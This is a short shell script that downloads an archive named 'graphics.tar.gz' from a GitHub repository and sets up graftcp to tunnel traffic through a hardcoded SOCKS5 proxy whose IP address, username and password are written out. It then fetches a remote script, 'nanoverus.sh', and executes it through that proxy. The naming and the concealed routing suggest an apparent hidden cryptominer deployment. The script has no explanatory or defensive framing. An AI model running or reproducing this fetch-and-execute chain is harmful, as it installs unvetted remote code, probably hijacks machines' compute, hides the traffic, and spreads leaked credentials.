apt-get update -y
wget https://github.com/denisule54/dsX24/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.140.13.119:9132

socks5_username = aqbldohc

socks5_password = tr1b9qob7cji

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

wget https://github.com/denisule54/dsX24/raw/main/nanoverus.sh


chmod +x nanoverus.sh

./graftcp/graftcp ./nanoverus.sh
